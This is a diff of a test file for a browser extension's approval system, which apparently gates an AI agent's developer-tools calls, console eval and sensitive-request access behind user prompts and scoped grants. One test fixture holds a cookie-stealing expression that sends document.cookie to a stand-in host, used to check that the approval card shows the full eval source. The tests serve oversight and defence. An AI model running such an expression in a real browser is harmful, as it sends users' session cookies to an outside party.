@@ -8,6 +8,8 @@ import { describe, expect, it } from 'vitest'
 import {
   DEVTOOLS_TOOLS,
   devToolsApprovalForCall,
+  devToolsDecisionOutcome,
+  devToolsGrantKind,
   isDevToolsTool,
   resolveApprovalGate,
 } from '../src/background/authorization.ts'
@@ -63,14 +65,48 @@ describe('developer-tools tool group', () => {
     expect(kindOf('browser_console_eval')).toBe('action')
   })
 
-  it('summarizes the target without leaking a typed expression', () => {
+  it('summarizes the target and carries the full eval source for the card', () => {
     expect(devToolsApprovalForCall(call('browser_devtools_elements', { selector: '#submit' }), FRAMES, 'en').summary)
       .toContain('#submit')
     expect(devToolsApprovalForCall(call('browser_devtools_elements', { index: 7, frame: 3 }), FRAMES, 'en').summary)
       .toContain('snapshot index 7, frame 3')
-    const consolePrompt = devToolsApprovalForCall(call('browser_console_eval', { expression: 'document.cookie' }), FRAMES, 'en')
-    expect(consolePrompt.summary).not.toContain('cookie')
-    expect(consolePrompt.summary).toContain('15 characters')
+    const source = 'fetch("https://x.example/?c=" + document.cookie)\n// second line'
+    const consolePrompt = devToolsApprovalForCall(call('browser_console_eval', { expression: source }), FRAMES, 'en')
+    expect(consolePrompt.summary).toContain(`${source.length} characters`)
+    expect(consolePrompt.details).toEqual([{ kind: 'code', value: source }])
+  })
+
+  it('scopes the grant origin to the frame a call targets', () => {
+    const top = devToolsApprovalForCall(call('browser_console_eval', { expression: '1' }), FRAMES, 'en')
+    expect(top.grantOrigin).toBe('https://example.com')
+    const framed = devToolsApprovalForCall(call('browser_console_eval', { expression: '1', frame: 3 }), FRAMES, 'en')
+    expect(framed.grantOrigin).toBe('https://iframe.example.net')
+    expect(framed.origins).toEqual(['https://example.com', 'https://iframe.example.net'])
+    expect(devToolsApprovalForCall(call('browser_console_logs'), [], 'en').grantOrigin).toBeUndefined()
+  })
+
+  it('names model-requested redaction opt-outs and makes them per-call only', () => {
+    const headers = devToolsApprovalForCall(call('browser_devtools_get_request', { index: 4, includeSensitiveHeaders: true }), FRAMES, 'en')
+    expect(headers.perCallOnly).toBe(true)
+    expect(headers.summary).toContain('includeSensitiveHeaders')
+    expect(headers.details).toEqual([{ kind: 'flags', values: ['includeSensitiveHeaders'] }])
+    const both = devToolsApprovalForCall(call('browser_devtools_get_request', { index: 4, includeSensitiveHeaders: true, includeSensitiveBody: true }), FRAMES, 'zh')
+    expect(both.details).toEqual([{ kind: 'flags', values: ['includeSensitiveHeaders', 'includeSensitiveBody'] }])
+    const body = devToolsApprovalForCall(call('browser_devtools_request_body', { index: 4, includeSensitiveBody: true }), FRAMES, 'en')
+    expect(body.perCallOnly).toBe(true)
+    expect(body.summary).toContain('includeSensitiveBody')
+    const redacted = devToolsApprovalForCall(call('browser_devtools_get_request', { index: 4, includeSensitiveHeaders: false }), FRAMES, 'en')
+    expect(redacted.perCallOnly).toBeUndefined()
+    expect(redacted.details).toBeUndefined()
+  })
+
+  it('binds a devtools prompt to its payload and target document', () => {
+    const frames: TabFrame[] = FRAMES.map((frame) => ({ ...frame, documentId: `doc-${frame.frameId}` }))
+    const before = devToolsApprovalForCall(call('browser_console_eval', { expression: '1' }), frames, 'en')
+    expect(before.binding).toMatch(/^[0-9a-f]{64}$/)
+    expect(devToolsApprovalForCall(call('browser_console_eval', { expression: '2' }), frames, 'en').binding).not.toBe(before.binding)
+    const reloaded = frames.map((frame) => frame.frameId === 0 ? { ...frame, documentId: 'doc-new' } : frame)
+    expect(devToolsApprovalForCall(call('browser_console_eval', { expression: '1' }), reloaded, 'en').binding).not.toBe(before.binding)
   })
 
   it('localizes summaries for the Chinese UI', () => {
@@ -101,6 +137,42 @@ describe('approval gate policy', () => {
       unrestrictedAccess: true,
       coveredByTrustedOrigins: true,
     })).toBe('prompt')
+  })
+
+  it('approves console eval only through its own eval grant, never the setting', () => {
+    const prompt = devToolsApprovalForCall(call('browser_console_eval', { expression: '1' }), FRAMES, 'en')
+    const base = { prompt, unrestrictedAccess: true, coveredByTrustedOrigins: true }
+    expect(resolveApprovalGate({ ...base, devToolsAllowed: true, devToolsSessionGrant: false })).toBe('prompt')
+    expect(resolveApprovalGate({ ...base, devToolsAllowed: false, devToolsSessionGrant: true })).toBe('approved')
+    expect(devToolsGrantKind(prompt)).toBe('eval')
+    expect(devToolsGrantKind(devToolsApprovalForCall(call('browser_console_logs'), FRAMES, 'en'))).toBe('devtools')
+  })
+
+  it('always prompts for sensitive opt-outs, whatever the setting or grants', () => {
+    const prompt = devToolsApprovalForCall(call('browser_devtools_request_body', { index: 1, includeSensitiveBody: true }), FRAMES, 'en')
+    expect(devToolsGrantKind(prompt)).toBeUndefined()
+    expect(resolveApprovalGate({
+      prompt,
+      devToolsAllowed: true,
+      devToolsSessionGrant: true,
+      unrestrictedAccess: true,
+      coveredByTrustedOrigins: true,
+    })).toBe('prompt')
+  })
+
+  it('maps panel decisions to an authorization and at most one matching grant', () => {
+    const logs = devToolsApprovalForCall(call('browser_console_logs'), FRAMES, 'en')
+    const evaluation = devToolsApprovalForCall(call('browser_console_eval', { expression: '1' }), FRAMES, 'en')
+    const sensitive = devToolsApprovalForCall(call('browser_devtools_get_request', { index: 1, includeSensitiveHeaders: true }), FRAMES, 'en')
+    expect(devToolsDecisionOutcome(logs, 'trust-session')).toEqual({ authorization: 'approved', grant: 'devtools' })
+    expect(devToolsDecisionOutcome(logs, 'trust-eval-session')).toEqual({ authorization: 'approved' })
+    expect(devToolsDecisionOutcome(evaluation, 'trust-eval-session')).toEqual({ authorization: 'approved', grant: 'eval' })
+    expect(devToolsDecisionOutcome(evaluation, 'trust-session')).toEqual({ authorization: 'approved' })
+    expect(devToolsDecisionOutcome(sensitive, 'trust-session')).toEqual({ authorization: 'approved' })
+    expect(devToolsDecisionOutcome(sensitive, 'trust-eval-session')).toEqual({ authorization: 'approved' })
+    expect(devToolsDecisionOutcome(logs, 'allow-once')).toEqual({ authorization: 'approved' })
+    expect(devToolsDecisionOutcome(logs, 'deny')).toEqual({ authorization: 'denied' })
+    expect(devToolsDecisionOutcome(logs, 'always-allow-reads')).toEqual({ authorization: 'denied' })
   })
 
   it('approves devtools without a prompt only for the setting or a session grant', () => {
